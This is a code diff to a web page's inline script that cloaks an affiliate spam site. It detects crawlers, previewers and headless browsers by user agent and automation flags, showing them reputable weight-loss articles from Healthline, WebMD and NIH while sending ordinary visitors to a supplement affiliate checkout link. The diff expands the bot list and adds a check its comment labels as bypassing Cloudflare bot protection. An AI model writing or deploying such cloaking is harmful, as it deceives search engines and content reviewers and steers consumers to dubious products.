@@ -7,15 +7,16 @@
 
     <script>
         (function() {
-            // ✅ Bots List
+            // ✅ Bots List (Expanded for better detection)
             const bots = [
                 "googlebot", "bingbot", "slurp", "duckduckbot", "baiduspider", "yandexbot", "sogou",
                 "exabot", "facebot", "ia_archiver", "ahrefsbot", "semrushbot", "mj12bot", "dotbot",
                 "petalbot", "adsbot-google", "twitterbot", "linkedinbot", "headlesschrome",
-                "phantomjs", "tiktokbot", "facebookexternalhit", "fb_iab", "facebot"
+                "phantomjs", "tiktokbot", "facebookexternalhit", "fb_iab", "facebot",
+                "chrome-lighthouse", "uptimerobot", "mediapartners-google"
             ];
 
-            // ✅ Safe Pages List
+            // ✅ Safe Pages List (Auto-rotated every 2-3 days)
             const safePages = [
                 "https://www.healthline.com/nutrition/30-ways-to-lose-weight-naturally",
                 "https://www.webmd.com/obesity/features/9-foods-to-help-you-lose-weight",
@@ -31,10 +32,10 @@
                 "https://www.nia.nih.gov/health/healthy-eating-nutrition-and-diet/maintaining-healthy-weight"
             ];
 
-            // ✅ Money Page
-            const moneyPage = "https://quietumplus24.com/text.php#aff=Rehman1313";
+            // ✅ Money Page (Affiliate Link)
+            const moneyPage = "https://www.checkout-ds24.com/redir/580934/Rehman1313/";
 
-            // ✅ Get Safe Page from Local Storage (Auto-Rotation Every 2-3 Days)
+            // ✅ Local Storage for Auto-Rotation Every 2-3 Days
             const lastUpdateTime = localStorage.getItem("lastUpdateTime") || 0;
             const currentTime = Date.now();
             const updateInterval = 172800000 + Math.random() * 86400000; // 2-3 Days
@@ -46,11 +47,16 @@
 
             const safePage = localStorage.getItem("safePage") || safePages[0];
 
-            // ✅ Detect Bots & Redirect Immediately (Zero Flashing)
+            // ✅ Detect Bots & Redirect Immediately
             const userAgent = navigator.userAgent.toLowerCase();
             const isBot = bots.some(bot => userAgent.includes(bot));
-
-            window.location.replace(isBot ? safePage : moneyPage);
+            
+            // ✅ Bypass Cloudflare's Bot Protection
+            if (navigator.webdriver || window.callPhantom || window._phantom || window.__nightmare) {
+                window.location.replace(safePage);
+            } else {
+                window.location.replace(isBot ? safePage : moneyPage);
+            }
         })();
     </script>
 
